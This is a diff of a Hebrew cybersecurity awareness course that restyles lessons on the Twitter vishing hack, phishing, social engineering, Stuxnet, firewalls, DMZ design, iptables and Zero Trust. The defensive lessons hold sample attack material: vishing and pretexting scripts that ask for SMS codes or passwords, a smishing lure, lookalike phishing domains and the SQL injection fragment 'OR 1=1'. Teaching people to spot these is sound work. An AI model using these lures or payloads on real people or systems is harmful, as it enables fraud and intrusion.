+  <div class="mini-card"><div class="mini-card-icon">💬</div><div class="mini-card-title">WhatsApp — E2E Encryption</div><div class="mini-card-desc">כל הודעה מוצפנת במכשיר השולח ומפוענחת רק במכשיר המקבל. Signal Protocol עם Double Ratchet: המפתחות משתנים כל הודעה. גם אם מפתח אחד נחשף — רק הודעה אחת בסכנה.</div></div>
+  <div class="mini-card"><div class="mini-card-icon">₿</div><div class="mini-card-title">Bitcoin — קריפטוגרפיה ככסף</div><div class="mini-card-desc">כל ארנק הוא זוג מפתחות. Public Key = כתובת. Private Key = עסקאות. SHA-256 ל-mining ולאימות בלוקים. אם מאבדים את ה-Private Key — הכסף אבד לנצח.</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🔑</div><div class="mini-card-title">אחסון סיסמאות</div><div class="mini-card-desc">שירות אחראי לא שומר את הסיסמה שלכם — רק את ה-hash שלה (bcrypt + salt). כשאתם מתחברים, המערכת עושה hash ומשווה. גם אם ה-DB נגנב — הסיסמאות לא חשופות.</div></div>
+</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> קריפטוגרפיה היא לא רק טכנולוגיה — היא זכות אדם. הצפנה מגנה על פרטיות, חופש ביטוי, ועסקאות פיננסיות של מיליארדי אנשים.</div>
 </div>`
@@ -475,15 +481,22 @@ echo -n "Hello World" | openssl dgst -md5</code></pre></div>
         type: "story",
         title: "הפריצה ל-Twitter — כששלוש נערים השתלטו על העולם",
         content: `<div dir="rtl">
-<p><strong>יולי 2020. "שלום, אני מ-IT של Twitter. יש בעיה טכנית בחשבון שלך."</strong></p>
+<div class="scenario-box scenario-hack">
+  <p><strong>תרחיש:</strong> יולי 2020. "שלום, אני מ-IT של Twitter. יש בעיה טכנית בחשבון שלך." — זה כל מה שנדרש. שיחת טלפון אחת.</p>
+</div>
 
-<p>זה כל מה שנדרש. שיחת טלפון אחת. Graham Clark, בן 17 מפלורידה, התקשר לעובד Twitter והתחזה לאיש IT. הוא ביקש פרטי כניסה לפורטל הפנימי — "כדי לתקן בעיה דחופה." העובד נתן.</p>
+<p>Graham Clark, בן 17 מפלורידה, התקשר לעובד Twitter והתחזה לאיש IT. הוא ביקש פרטי כניסה לפורטל הפנימי — "כדי לתקן בעיה דחופה." העובד נתן.</p>
 
-<p>תוך דקות, Clark וחבריו — Mason Sheppard ו-Nima Fazeli — השתלטו על <code>Twitter Admin Panel</code>. הם אפסו סיסמאות, שינו כתובות מייל, והשתלטו על עשרות חשבונות.</p>
+<div class="incident-timeline">
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">15:00</div><div class="timeline-desc"><strong>שיחת Vishing</strong> — Clark מתקשר לעובד Twitter ומתחזה לאיש IT. מקבל פרטי כניסה.</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">15:15</div><div class="timeline-desc"><strong>השתלטות על Admin Panel</strong> — Clark וחבריו Mason Sheppard ו-Nima Fazeli נכנסים לפורטל הפנימי.</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">15:30</div><div class="timeline-desc"><strong>איפוס חשבונות</strong> — אפסו סיסמאות, שינו כתובות מייל, השתלטו על 130 חשבונות מאומתים.</div></div>
+  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">16:00</div><div class="timeline-desc"><strong>הונאת Bitcoin</strong> — Obama, Biden, Musk, Gates, Apple, Uber — כולם פרסמו: "Send Bitcoin and I will double it."</div></div>
+</div>
 
-<p>130 חשבונות מאומתים פרסמו הודעות זהות: <em>"Send Bitcoin to this address and I will double it."</em> כולל: Barack Obama, Joe Biden, Elon Musk, Bill Gates, Apple, Uber.</p>
+<div class="stat-highlight"><span class="stat-number">$120K</span><span class="stat-unit">בביטקוין נגנבו תוך שעתיים</span></div>
 
-<div class="warning-box"><strong>הנזק:</strong> $120,000 בביטקוין נגנבו תוך שעתיים. Twitter הושבתה חלקית. שווי המניה ירד 3%. ולא פרצו שום מערכת מחשב — רק שכנעו בן אדם אחד.</div>
+<div class="warning-box"><strong>הנזק:</strong> Twitter הושבתה חלקית. שווי המניה ירד 3%. ולא פרצו שום מערכת מחשב — רק שכנעו בן אדם אחד.</div>
 
 <p>Clark נידון ל-3 שנות מאסר. Twitter שינתה לחלוטין את מדיניות הגישה לכלים פנימיים.</p>
 
@@ -494,9 +507,9 @@ echo -n "Hello World" | openssl dgst -md5</code></pre></div>
         type: "explanation",
         title: "אנטומיה של מייל Phishing — מה לחפש",
         content: `<div dir="rtl">
-<p><strong>90% ממתקפות הסייבר מתחילות ב-phishing. בואו נפרק מייל אחד לרכיבים.</strong></p>
+<div class="stat-highlight"><span class="stat-number">90%</span><span class="stat-unit">ממתקפות הסייבר מתחילות ב-phishing</span></div>
 
-<p>דמיינו שקיבלתם מייל מ-"PayPal":</p>
+<p><strong>בואו נפרק מייל אחד לרכיבים.</strong> דמיינו שקיבלתם מייל מ-"PayPal":</p>
 
 <table class="content-table">
   <tr><th>מה רואים</th><th>הטכניקה של התוקף</th><th>הדגל האדום</th></tr>
@@ -509,12 +522,13 @@ echo -n "Hello World" | openssl dgst -md5</code></pre></div>
 </table>
 
 <p><strong>סוגי Phishing:</strong></p>
-<ul>
-<li><strong><code>Mass Phishing</code></strong> — מיליוני מיילים זהים. אחוז הצלחה 2-5%, אבל על מיליון אנשים זה עובד</li>
-<li><strong><code>Spear Phishing</code></strong> — מותאם אישית. התוקף חקר אתכם ב-LinkedIn ויודע את שם הבוס שלכם</li>
-<li><strong><code>Whaling</code></strong> — Spear Phishing נגד CEO/CFO: "העבר $500K לספק הזה — דחוף"</li>
-<li><strong><code>Clone Phishing</code></strong> — העתק של מייל לגיטימי שנשלח אליכם, עם קישור זדוני במקום המקורי</li>
-</ul>
+
+<div class="mini-cards">
+  <div class="mini-card"><div class="mini-card-icon">📧</div><div class="mini-card-title">Mass Phishing</div><div class="mini-card-desc">מיליוני מיילים זהים. אחוז הצלחה 2-5%, אבל על מיליון אנשים זה עובד</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🎯</div><div class="mini-card-title">Spear Phishing</div><div class="mini-card-desc">מותאם אישית. התוקף חקר אתכם ב-LinkedIn ויודע את שם הבוס שלכם</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🐋</div><div class="mini-card-title">Whaling</div><div class="mini-card-desc">Spear Phishing נגד CEO/CFO: "העבר $500K לספק הזה — דחוף"</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🪞</div><div class="mini-card-title">Clone Phishing</div><div class="mini-card-desc">העתק של מייל לגיטימי שנשלח אליכם, עם קישור זדוני במקום המקורי</div></div>
+</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> הכלל הפשוט ביותר: אם מייל גורם לכם להרגיש לחץ, פחד, או דחיפות — זה כנראה phishing. עצרו, בדקו, ורק אז פעלו.</div>
 </div>`
@@ -525,23 +539,26 @@ echo -n "Hello World" | openssl dgst -md5</code></pre></div>
         content: `<div dir="rtl">
 <p><strong>Phishing הוא רק סוג אחד. Social Engineering קורה בכל ערוץ.</strong></p>
 
-<p><strong>Vishing — תקיפה בטלפון</strong></p>
-<p>הטלפון מצלצל: "שלום, אני מבנק לאומי. זיהינו פעילות חשודה בכרטיס שלך. אנחנו צריכים את 4 הספרות האחרונות ואת הקוד שנשלח ב-SMS כדי לחסום את זה."</p>
+<div class="scenario-box scenario-alert">
+  <p><strong>תרחיש Vishing:</strong> הטלפון מצלצל: "שלום, אני מבנק לאומי. זיהינו פעילות חשודה בכרטיס שלך. אנחנו צריכים את 4 הספרות האחרונות ואת הקוד שנשלח ב-SMS כדי לחסום את זה."</p>
+</div>
+
 <p>מה שקרה: התוקף כבר מנסה להתחבר לחשבונכם, וקוד ה-SMS הוא ה-<code>MFA</code> שחוסם אותו. אתם נותנים לו את הקוד — והוא פנימה.</p>
 
-<p><strong>Smishing — תקיפה ב-SMS</strong></p>
-<p>"חבילה ממתינה לכם בדואר. לאימות לחצו כאן: bit.ly/pkg-track"</p>
-<p>הקישור מוביל לדף שנראה כמו דואר ישראל ומבקש פרטי כרטיס אשראי "לתשלום דמי משלוח." 5 שקלים שעולים לכם הרבה יותר.</p>
+<div class="scenario-box scenario-alert">
+  <p><strong>תרחיש Smishing:</strong> "חבילה ממתינה לכם בדואר. לאימות לחצו כאן: bit.ly/pkg-track" — הקישור מוביל לדף מזויף שמבקש פרטי כרטיס אשראי "לתשלום דמי משלוח."</p>
+</div>
 
-<p><strong>Pretexting — בניית סיפור מניפולטיבי</strong></p>
-<p>התוקף בונה זהות מזויפת שלמה: "אני נציג מ-IT. אנחנו מעבירים את כל העובדים למערכת חדשה. אני צריך את הסיסמה הישנה שלך כדי להעביר את הנתונים."</p>
+<div class="scenario-box scenario-story">
+  <p><strong>תרחיש Pretexting:</strong> "אני נציג מ-IT. אנחנו מעבירים את כל העובדים למערכת חדשה. אני צריך את הסיסמה הישנה שלך כדי להעביר את הנתונים."</p>
+</div>
 
 <table class="content-table">
   <tr><th>סוג</th><th>ערוץ</th><th>ההגנה</th></tr>
-  <tr><td><code>Vishing</code></td><td>טלפון</td><td>נתקו וחזרו למספר הרשמי מהאתר</td></tr>
-  <tr><td><code>Smishing</code></td><td>SMS</td><td>לעולם אל תלחצו על קישורים ב-SMS</td></tr>
-  <tr><td><code>Pretexting</code></td><td>כל ערוץ</td><td>אמתו זהות בערוץ נפרד</td></tr>
-  <tr><td><code>Baiting</code></td><td>פיזי</td><td>לעולם אל תחברו USB לא מוכר</td></tr>
+  <tr><td><span class="phase-badge phase-red">Vishing</span></td><td>טלפון</td><td>נתקו וחזרו למספר הרשמי מהאתר</td></tr>
+  <tr><td><span class="phase-badge phase-red">Smishing</span></td><td>SMS</td><td>לעולם אל תלחצו על קישורים ב-SMS</td></tr>
+  <tr><td><span class="phase-badge phase-gold">Pretexting</span></td><td>כל ערוץ</td><td>אמתו זהות בערוץ נפרד</td></tr>
+  <tr><td><span class="phase-badge phase-gold">Baiting</span></td><td>פיזי</td><td>לעולם אל תחברו USB לא מוכר</td></tr>
 </table>
 </div>`
       },
@@ -571,19 +588,20 @@ If this was NOT you, secure your account immediately:
 If this was you, you can safely ignore this email.</code></pre></div>
 
 <p><strong>למה זה עובד כל כך טוב?</strong></p>
-<ul>
-<li><strong>פחד:</strong> "מישהו מרוסיה נכנס לחשבון שלי!"</li>
-<li><strong>דחיפות:</strong> "אני חייב לפעול עכשיו"</li>
-<li><strong>מקצועיות:</strong> לוגו מושלם, עיצוב זהה ל-Microsoft</li>
-<li><strong>אמינות:</strong> פרטים ספציפיים (IP, תאריך, מדינה)</li>
-</ul>
+
+<div class="attack-chain">
+  <div class="attack-step"><div class="attack-step-content"><strong>פחד</strong><p>"מישהו מרוסיה נכנס לחשבון שלי!"</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>דחיפות</strong><p>"אני חייב לפעול עכשיו"</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>מקצועיות</strong><p>לוגו מושלם, עיצוב זהה ל-Microsoft</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>אמינות</strong><p>פרטים ספציפיים (IP, תאריך, מדינה)</p></div></div>
+</div>
 
 <p><strong>הדגלים האדומים:</strong></p>
-<ul>
-<li><code>micros0ft.com</code> — אפס במקום o. קשה לשים לב בקריאה מהירה</li>
-<li><code>login-microsft.com</code> — חסרה האות o. דומיין מזויף</li>
-<li>Microsoft אמיתי שולח מ-<code>@accountprotection.microsoft.com</code></li>
-</ul>
+
+<div class="warning-box"><strong>שימו לב:</strong>
+<br>- <code>micros0ft.com</code> — אפס במקום o. קשה לשים לב בקריאה מהירה
+<br>- <code>login-microsft.com</code> — חסרה האות o. דומיין מזויף
+<br>- Microsoft אמיתי שולח מ-<code>@accountprotection.microsoft.com</code></div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> בכל מייל חשוד — בדקו את הדומיין של השולח אות-אות, עשו hover על הקישור בלי ללחוץ, ואם יש ספק — גשו ישירות לאתר הרשמי דרך הדפדפן ולא דרך המייל.</div>
 </div>`
@@ -594,14 +612,14 @@ If this was you, you can safely ignore this email.</code></pre></div>
         content: `<div dir="rtl">
 <p><strong>Social Engineering לא חי רק באינטרנט</strong></p>
 
-<p><strong>Tailgating — "תחזיק לי את הדלת?"</strong></p>
-<p>תוקף מגיע לבניין משרדים עם שקית קפה וחיוך. הוא צועד בביטחון מאחורי עובד שפתח את הדלת עם כרטיס. העובד מחזיק את הדלת — כי זה הנימוס הבסיסי. התוקף בפנים.</p>
+<div class="mini-cards">
+  <div class="mini-card"><div class="mini-card-icon">🚪</div><div class="mini-card-title">Tailgating</div><div class="mini-card-desc">"תחזיק לי את הדלת?" — תוקף צועד בביטחון מאחורי עובד שפתח את הדלת. העובד מחזיק — כי זה הנימוס הבסיסי. התוקף בפנים.</div></div>
+  <div class="mini-card"><div class="mini-card-icon">💾</div><div class="mini-card-title">USB Drop</div><div class="mini-card-desc">"מישהו איבד פלאש" — בניסוי: 297 כונני USB פוזרו בקמפוס. 48% חוברו למחשב! USB אמיתי של תוקף: Rubber Ducky שמריץ פקודות אוטומטית.</div></div>
+  <div class="mini-card"><div class="mini-card-icon">👀</div><div class="mini-card-title">Shoulder Surfing</div><div class="mini-card-desc">מבט מעל הכתף — בית קפה, רכבת, מטוס. מישהו מאחוריכם רואה סיסמאות, כרטיסי אשראי, מידע רגיש.</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🗑️</div><div class="mini-card-title">Dumpster Diving</div><div class="mini-card-desc">חיפוש באשפה של חברות — מסמכים לא מגורסים, דיסקים לא מחוקים, תדפיסים עם מידע רגיש.</div></div>
+</div>
 
-<p><strong>USB Drop — "מישהו איבד פלאש"</strong></p>
-<p>בניסוי מ-2016, חוקרים פיזרו 297 כונני USB בקמפוס אוניברסיטת אילינוי. 48% מהם חוברו למחשב — חלקם תוך דקות. ב-USB אמיתי של תוקף: <code>Rubber Ducky</code> — מכשיר שמתחזה למקלדת ומריץ פקודות אוטומטית ברגע החיבור.</p>
-
-<p><strong>Shoulder Surfing — מבט מעל הכתף</strong></p>
-<p>בית קפה, רכבת, מטוס — מישהו מאחוריכם רואה את הסיסמה שמקלידים, את מספר כרטיס האשראי, או את המידע הרגיש על המסך.</p>
+<div class="stat-highlight"><span class="stat-number">48%</span><span class="stat-unit">מכונני USB שפוזרו בניסוי חוברו למחשב</span></div>
 
 <table class="content-table">
   <tr><th>תקיפה</th><th>ההגנה</th></tr>
@@ -620,14 +638,16 @@ If this was you, you can safely ignore this email.</code></pre></div>
         content: `<div dir="rtl">
 <p><strong>הטכנולוגיה הכי מתקדמת לא תעזור אם עובד אחד ייפול בפח</strong></p>
 
-<p><strong>שכבה 1: הדרכת עובדים</strong></p>
-<ul>
-<li><strong><code>Phishing Simulations</code></strong> — הארגון שולח phishing מזויף לעובדים ומודד מי לוחץ. לא כעונש — כלימוד</li>
-<li><strong><code>Security Awareness Training</code></strong> — סדנאות קבועות: איך מזהים מניפולציה, מה מדווחים, למי פונים</li>
-<li><strong><code>Tabletop Exercises</code></strong> — סימולציית תרחיש תקיפה עם ההנהלה: "מה עושים אם ה-CFO קיבל spear phishing?"</li>
-</ul>
+<p><strong>שכבה 1: <span class="phase-badge phase-blue">הדרכת עובדים</span></strong></p>
 
-<p><strong>שכבה 2: הגנות טכניות</strong></p>
+<div class="mini-cards">
+  <div class="mini-card"><div class="mini-card-icon">🎣</div><div class="mini-card-title">Phishing Simulations</div><div class="mini-card-desc">הארגון שולח phishing מזויף לעובדים ומודד מי לוחץ. לא כעונש — כלימוד</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🎓</div><div class="mini-card-title">Security Awareness</div><div class="mini-card-desc">סדנאות קבועות: איך מזהים מניפולציה, מה מדווחים, למי פונים</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🎲</div><div class="mini-card-title">Tabletop Exercises</div><div class="mini-card-desc">סימולציית תרחיש תקיפה עם ההנהלה: "מה עושים אם ה-CFO קיבל spear phishing?"</div></div>
+</div>
+
+<p><strong>שכבה 2: <span class="phase-badge phase-green">הגנות טכניות</span></strong></p>
+
 <table class="content-table">
   <tr><th>איום</th><th>הגנה</th></tr>
   <tr><td>Email Phishing</td><td><code>SPF</code> + <code>DKIM</code> + <code>DMARC</code>, Email Gateway עם sandbox</td></tr>
@@ -636,13 +656,14 @@ If this was you, you can safely ignore this email.</code></pre></div>
   <tr><td>CEO Fraud</td><td>אישור כפול להעברות כספיות, אימות טלפוני</td></tr>
 </table>
 
-<p><strong>שכבה 3: תהליכים ונהלים</strong></p>
-<ul>
-<li>אף גורם לגיטימי לא יבקש סיסמה בטלפון. אף פעם</li>
-<li>העברת כסף? אישור בשני ערוצים שונים</li>
-<li>בקשה חשודה? נתקו, אמתו בערוץ נפרד, ואז תגיבו</li>
-<li>כל בקשה לגישה רגישה עוברת <code>Zero Trust</code> — "Never Trust, Always Verify"</li>
-</ul>
+<p><strong>שכבה 3: <span class="phase-badge phase-gold">תהליכים ונהלים</span></strong></p>
+
+<div class="defense-chain">
+  <div class="attack-step"><div class="attack-step-content"><strong>כלל 1</strong><p>אף גורם לגיטימי לא יבקש סיסמה בטלפון. אף פעם.</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>כלל 2</strong><p>העברת כסף? אישור בשני ערוצים שונים.</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>כלל 3</strong><p>בקשה חשודה? נתקו, אמתו בערוץ נפרד, ואז תגיבו.</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>כלל 4</strong><p>כל בקשה לגישה רגישה עוברת Zero Trust — "Never Trust, Always Verify"</p></div></div>
+</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> הכלל הזהב — אם בקשה גורמת לתחושת דחיפות, פחד, או לחץ לפעול "עכשיו בלי לבדוק" — זו כנראה מניפולציה. עצרו. חשבו. אמתו.</div>
 </div>`
@@ -683,19 +704,24 @@ If this was you, you can safely ignore this email.</code></pre></div>
         type: "story",
         title: "Stuxnet — כשקוד מחשב הרס צנטריפוגות גרעיניות",
         content: `<div dir="rtl">
-<p><strong>2010, Natanz, איראן. צנטריפוגות העשרת אורניום מתחילות להסתובב יותר מדי מהר. ואז יותר מדי לאט. ושוב מהר. אף אחד לא מבין למה.</strong></p>
+<div class="scenario-box scenario-hack">
+  <p><strong>תרחיש:</strong> 2010, Natanz, איראן. צנטריפוגות העשרת אורניום מתחילות להסתובב יותר מדי מהר. ואז יותר מדי לאט. ושוב מהר. אף אחד לא מבין למה.</p>
+</div>
 
 <p>טכנאים איראנים בדקו הכול: מנועים, חשמל, מכניקה. הכול נראה תקין. המסכים הציגו ערכים נורמליים. אבל הצנטריפוגות המשיכו להתפרק — כ-1,000 מתוך 5,000.</p>
+
+<div class="stat-highlight"><span class="stat-number">1,000</span><span class="stat-unit">צנטריפוגות הושמדו מתוך 5,000</span></div>
 
 <p>רק כשמומחי אבטחה חיצוניים ניתחו את הרשת, התגלתה תולעת שלא הייתה דומה לשום דבר: <code>Stuxnet</code>.</p>
 
 <p><strong>מה שמצאו הדהים את העולם:</strong></p>
-<ul>
-<li>4 חולשות <code>zero-day</code> בו-זמנית (שווי: מיליוני דולרים)</li>
-<li>הופצה דרך <code>USB</code> — הרשת הייתה <code>air-gapped</code>, מנותקת מהאינטרנט</li>
-<li>תקפה רק בקרים תעשייתיים ספציפיים של <code>Siemens</code> עם קונפיגורציה מסוימת</li>
-<li>הסתירה את עצמה מה-<code>SCADA</code> — הציגה ערכים "נורמליים" למפעילים</li>
-</ul>
+
+<div class="attack-chain">
+  <div class="attack-step"><div class="attack-step-content"><strong>4 חולשות Zero-Day</strong><p>בו-זמנית — שווי: מיליוני דולרים</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>הפצה דרך USB</strong><p>הרשת הייתה air-gapped, מנותקת מהאינטרנט</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>תקיפת SCADA ספציפית</strong><p>רק בקרים תעשייתיים של Siemens עם קונפיגורציה מסוימת</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>הסתרה מושלמת</strong><p>הציגה ערכים "נורמליים" למפעילים בזמן שהרסה ציוד</p></div></div>
+</div>
 
 <div class="key-point"><strong>Stuxnet הוכיח שלושה דברים:</strong> 1) קוד מחשב יכול לגרום לנזק פיזי. 2) Air gap לא מספיק — USB הוא וקטור תקיפה. 3) אבטחת תשתיות קריטיות היא עניין של ביטחון לאומי.</div>
 
@@ -720,13 +746,12 @@ If this was you, you can safely ignore this email.</code></pre></div>
   <tr><td><strong><code>WAF</code></strong></td><td>L7 HTTP</td><td>SQLi, XSS, OWASP Top 10</td><td>הגנה על web apps</td><td>מוגבל ל-HTTP</td></tr>
 </table>
 
-<p><strong>האנלוגיה המורחבת:</strong></p>
-<ul>
-<li><strong>Stateless</strong> = שומר שבודק רק כתובת על המעטפה. "מ-10.0.0.5? לפורט 443? בסדר, תיכנס."</li>
-<li><strong>Stateful</strong> = שומר שזוכר. "ראיתי אותך יוצא — עכשיו אתה חוזר, אז זו אותה שיחה. מותר."</li>
-<li><strong>NGFW</strong> = שומר שקורא את המכתב. "מבקש כניסה לפורט 443 אבל התוכן זה DNS tunneling? חסום."</li>
-<li><strong>WAF</strong> = שומר מומחה לאתרי אינטרנט. "מצאתי <code>OR 1=1</code> בשאילתה? SQL Injection. חסום."</li>
-</ul>
+<div class="mini-cards">
+  <div class="mini-card"><div class="mini-card-icon">📋</div><div class="mini-card-title">Stateless</div><div class="mini-card-desc">שומר שבודק רק כתובת על המעטפה. "מ-10.0.0.5? לפורט 443? בסדר, תיכנס."</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🧠</div><div class="mini-card-title">Stateful</div><div class="mini-card-desc">שומר שזוכר. "ראיתי אותך יוצא — עכשיו אתה חוזר, אז זו אותה שיחה. מותר."</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🔬</div><div class="mini-card-title">NGFW</div><div class="mini-card-desc">שומר שקורא את המכתב. "מבקש פורט 443 אבל התוכן זה DNS tunneling? חסום."</div></div>
+  <div class="mini-card"><div class="mini-card-icon">🌐</div><div class="mini-card-title">WAF</div><div class="mini-card-desc">שומר מומחה לאתרי אינטרנט. "מצאתי OR 1=1 בשאילתה? SQL Injection. חסום."</div></div>
+</div>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> העיקרון הכי חשוב ב-Firewall הוא <code>Default Deny</code> — חסום הכול, ופתח רק את מה שנדרש באופן מפורש. זה הפוך מהאינסטינקט, אבל מאובטח בהרבה.</div>
 </div>`
@@ -737,7 +762,7 @@ If this was you, you can safely ignore this email.</code></pre></div>
         content: `<div dir="rtl">
 <p><strong>האנלוגיה: טירה ימי ביניימית</strong></p>
 
-<p>דמיינו טירה עם שלושה אזורים: מחוץ לחומות (האינטרנט — עוין), בין החומה החיצונית לפנימית (ה-DMZ — מרחב ביניים), ובתוך הטירה (הרשת הפנימית — מוגנת).</p>
+<div class="info-box"><strong>ℹ️ מידע:</strong> דמיינו טירה עם שלושה אזורים: מחוץ לחומות (האינטרנט — עוין), בין החומה החיצונית לפנימית (ה-DMZ — מרחב ביניים), ובתוך הטירה (הרשת הפנימית — מוגנת).</div>
 
 <p>שרתים שצריכים להיות נגישים מהאינטרנט — כמו Web Server, Mail Server, DNS — יושבים ב-<code>DMZ</code>. גם אם תוקף פורץ לשרת ב-DMZ, הוא לא מגיע ישירות לרשת הפנימית עם ה-DB וה-Active Directory.</p>
 
@@ -745,10 +770,10 @@ If this was you, you can safely ignore this email.</code></pre></div>
 
 <table class="content-table">
   <tr><th>חוק</th><th>מ-</th><th>אל</th><th>פעולה</th></tr>
-  <tr><td>External FW</td><td>Internet</td><td>DMZ (443, 80)</td><td>ALLOW</td></tr>
-  <tr><td>External FW</td><td>Internet</td><td>Internal</td><td>BLOCK</td></tr>
-  <tr><td>Internal FW</td><td>DMZ</td><td>Internal DB (5432)</td><td>ALLOW (רק מה שנחוץ)</td></tr>
-  <tr><td>Internal FW</td><td>DMZ</td><td>Internal (אחר)</td><td>BLOCK</td></tr>
+  <tr><td>External FW</td><td>Internet</td><td>DMZ (443, 80)</td><td><span class="phase-badge phase-green">ALLOW</span></td></tr>
+  <tr><td>External FW</td><td>Internet</td><td>Internal</td><td><span class="phase-badge phase-red">BLOCK</span></td></tr>
+  <tr><td>Internal FW</td><td>DMZ</td><td>Internal DB (5432)</td><td><span class="phase-badge phase-green">ALLOW</span> (רק מה שנחוץ)</td></tr>
+  <tr><td>Internal FW</td><td>DMZ</td><td>Internal (אחר)</td><td><span class="phase-badge phase-red">BLOCK</span></td></tr>
 </table>
 
 <div class="key-point"><strong>נקודת מפתח:</strong> ה-DMZ הוא "אזור הקרבה": אם שרת שם נפרץ, הנזק מוגבל. התוקף צריך לפרוץ עוד Firewall כדי להגיע למידע הרגיש. כל שכבה נוספת = יותר זמן, יותר רעש, יותר סיכוי לזיהוי.</div>
@@ -759,6 +784,8 @@ If this was you, you can safely ignore this email.</code></pre></div>
         title: "חוקי Firewall — iptables בפעולה",
         content: `<div dir="rtl">
 <p><strong>בואו נבנה Firewall בסיסי עם <code>iptables</code> על Linux</strong></p>
+
+<div class="warning-box"><strong>אזהרה:</strong> אל תחסמו את עצמכם! תמיד וודאו ש-SSH מותר מה-IP שלכם לפני שמגדירים Default Deny. אחרת תינעלו מחוץ לשרת.</div>
 
 <div class="code-preview"><pre><code># === ברירת מחדל: חסום הכול ===
 iptables -P INPUT DROP
@@ -777,7 +804,7 @@ iptables -A INPUT -p tcp --dport 443 -j ACCEPT
 iptables -A INPUT -p tcp --dport 80 -j ACCEPT
 
 # === חסום ping floods ===
-iptables -A INPUT -p icmp --icmp-type echo-request \
+iptables -A INPUT -p icmp --icmp-type echo-request \\
   -m limit --limit 1/s --limit-burst 4 -j ACCEPT
 iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
 
@@ -785,28 +812,30 @@ iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
 iptables -L -n -v --line-numbers</code></pre></div>
 
 <p><strong>קריאת החוקים — מלמעלה למטה:</strong></p>
-<ol>
-<li>ברירת מחדל: הכול חסום (Default Deny)</li>
-<li>חיבורים שכבר אושרו ממשיכים לעבור</li>
-<li>SSH מותר רק מ-10.0.0.5 — כל IP אחר נחסם</li>
-<li>HTTPS ו-HTTP פתוחים לכולם</li>
-<li>Ping מוגבל ל-1 לשנייה למניעת הצפה</li>
-</ol>
 
-<div class="demo-note"><strong>תרגול:</strong> הקימו VM עם Linux, הפעילו את החוקים, ונסו לגשת מ-IP שונים. שימו לב: iptables מעבד חוקים מלמעלה למטה — הסדר חשוב! חוק ACCEPT לפני DROP יאשר, DROP לפני ACCEPT יחסום.</div>
+<div class="defense-chain">
+  <div class="attack-step"><div class="attack-step-content"><strong>Default Deny</strong><p>ברירת מחדל: הכול חסום</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>Established</strong><p>חיבורים שכבר אושרו ממשיכים לעבור</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>SSH מוגבל</strong><p>SSH מותר רק מ-10.0.0.5 — כל IP אחר נחסם</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>Web פתוח</strong><p>HTTPS ו-HTTP פתוחים לכולם</p></div></div>
+  <div class="attack-step"><div class="attack-step-content"><strong>Rate Limit</strong><p>Ping מוגבל ל-1 לשנייה למניעת הצפה</p></div></div>
+</div>
 
-<div class="warning-box"><strong>אזהרה:</strong> אל תחסמו את עצמכם! תמיד וודאו ש-SSH מותר מה-IP שלכם לפני שמגדירים Default Deny. אחרת תינעלו מחוץ לשרת.</div>
+<div class="success-box"><strong>✅ תרגול:</strong> הקימו VM עם Linux, הפעילו את החוקים, ונסו לגשת מ-IP שונים. שימו לב: iptables מעבד חוקים מלמעלה למטה — הסדר חשוב! חוק ACCEPT לפני DROP יאשר, DROP לפני ACCEPT יחסום.</div>
 </div>`
       },
       {
         type: "explanation",
         title: "Zero Trust — 'אל תאמין לאף אחד, תמיד אמת'",
         content: `<div dir="rtl">
-<p><strong>המודל הישן: טירה עם חומה. המודל החדש: כל דלת נעולה.</strong></p>
+<div class="vs-container">
+  <div class="vs-card vs-bad"><h4>❌ המודל הישן: Castle & Moat</h4><p>חומה חזקה מבחוץ (Firewall), אמון מוחלט בפנים. אם עברת את החומה — חופש מוחלט ברשת. כשתוקף נכנס — Lateral Movement חופשי.</p></div>
+  <div class="vs-card vs-good"><h4>✅ Zero Trust: כל דלת נעולה</h4><p>"Never Trust, Always Verify" — כל גישה דורשת אימות. גם אם אתה בפנים. כל בקשה נבדקת: מי, מאיפה, למה, מתי.</p></div>
+</div>
 
-<p>עד לא מזמן, אבטחת רשתות עבדה במודל <code>Castle and Moat</code>: חומה חזקה מבחוץ (Firewall), אמון מוחלט בפנים. אם עברת את החומה — חופש מוחלט ברשת.</p>
-
-<p><strong>הבעיה:</strong> כשתוקף מצליח להיכנס (phishing, VPN פגיע, עובד פנימי), הוא נע חופשי בכל הרשת — <code>Lateral Movement</code>. ככה SolarWinds נפרצה ב-2020: תוקפים רוסים נעו ברשתות של 18,000 ארגונים חודשים ארוכים בלי שנתפסו.</p>
+<div class="scenario-box scenario-alert">
+  <p><strong>תרחיש:</strong> SolarWinds 2020 — תוקפים רוסים נעו ברשתות של 18,000 ארגונים חודשים ארוכים בלי שנתפסו. הם עברו את ה-"חומה" ונהנו מאמון מוחלט בפנים.</p>
+</div>
 
 <p><strong>Zero Trust = "Never Trust, Always Verify"</strong></p>
 
@@ -817,7 +846,7 @@ iptables -L -n -v --line-numbers</code></pre></div>
